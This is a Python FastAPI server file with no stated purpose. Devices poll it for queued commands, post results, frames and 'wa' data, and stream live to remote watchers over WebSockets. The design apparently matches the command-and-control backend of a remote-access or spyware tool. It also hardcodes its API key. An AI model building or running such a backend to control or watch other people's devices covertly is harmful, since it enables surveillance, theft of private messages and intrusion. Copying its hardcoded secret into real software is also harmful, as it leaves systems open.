from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from typing import Dict, List
import json
import os

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

# In-memory storage
device_data = {} 
command_queue = []
active_streams = {} 
active_watchers = {} 

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_id = data.get("device_id")
    device_data[device_id] = data
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

@app.post("/result")
async def post_result(request: Request):
    check_key(request)
    data = await request.json()
    return {"status": "ok"}

@app.post("/wa")
async def post_wa(request: Request):
    check_key(request)
    data = await request.json()
    return {"status": "ok"}

@app.post("/frame")
async def post_frame(request: Request):
    check_key(request)
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    return {"devices": device_data}

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}

@app.websocket("/ws/stream")
async def stream_from_device(websocket: WebSocket, device_id: str):
    await websocket.accept()
    active_streams[device_id] = websocket
    try:
        while True:
            data = await websocket.receive_bytes()
            if device_id in active_watchers:
                for watcher in active_watchers[device_id]:
                    await watcher.send_bytes(data)
    except WebSocketDisconnect:
        if device_id in active_streams:
            del active_streams[device_id]

@app.websocket("/ws/watch")
async def watch_device(websocket: WebSocket, device_id: str):
    await websocket.accept()
    if device_id not in active_watchers:
        active_watchers[device_id] = []
    active_watchers[device_id].append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        active_watchers[device_id].remove(websocket)
